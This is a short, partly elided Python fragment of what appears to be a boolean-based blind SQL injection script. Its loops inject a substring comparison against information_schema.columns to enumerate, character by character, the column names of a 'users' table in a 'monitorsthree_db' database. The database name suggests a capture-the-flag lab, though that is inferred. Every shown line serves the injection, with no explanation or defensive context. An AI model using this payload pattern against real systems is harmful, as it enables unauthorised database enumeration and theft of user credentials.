  ...
  for position in range(0,6):
    for position_character in range(1,25):
      ...
      for character in characters:
        sqli=f"' or (select substr(column_name,{position_character},1) from information_schema.columns where table_schema='monitorsthree_db' and table_name = 'users' limit {position},1)='{character}'-- -"
